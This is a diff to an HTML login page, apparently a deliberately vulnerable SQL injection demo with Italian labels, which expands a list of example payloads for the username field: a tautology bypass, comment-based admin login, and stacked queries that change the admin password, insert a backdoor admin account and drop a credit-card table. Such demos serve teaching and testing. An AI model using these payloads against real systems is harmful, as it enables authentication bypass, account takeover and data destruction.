@@ -17,7 +17,14 @@
     <input name="password" placeholder="password" autocomplete="off" />
     <button type="submit" >Login</button>
   </form>
-  <p style="color:#666">Esempi: <code>' OR '1'='1' -- </code> <br> <code>admin' -- </code> <br> <code>anything'; INSERT INTO testdb.users (username,password) VALUES ('attacker','attackerpass'); -- </code></p>
+  <p style="color:#666">Esempi payload (campo username):</p>
+  <ul style="color:#666">
+    <li>Tautologia (bypass): <code>' OR '1'='1' -- </code></li>
+    <li>Commento fine riga (login come admin): <code>admin' -- </code></li>
+    <li>Piggyback UPDATE (Integrity): <code>x'; UPDATE users SET password='hacked123' WHERE username='admin'; -- </code></li>
+    <li>Piggyback INSERT backdoor: <code>x'; INSERT INTO users (username,password,ruolo) VALUES ('attacker','attackerpass','admin'); -- </code></li>
+    <li>Piggyback DROP (Availability): <code>x'; DROP TABLE carte_credito; -- </code></li>
+  </ul>
 </body>
 </html>
 
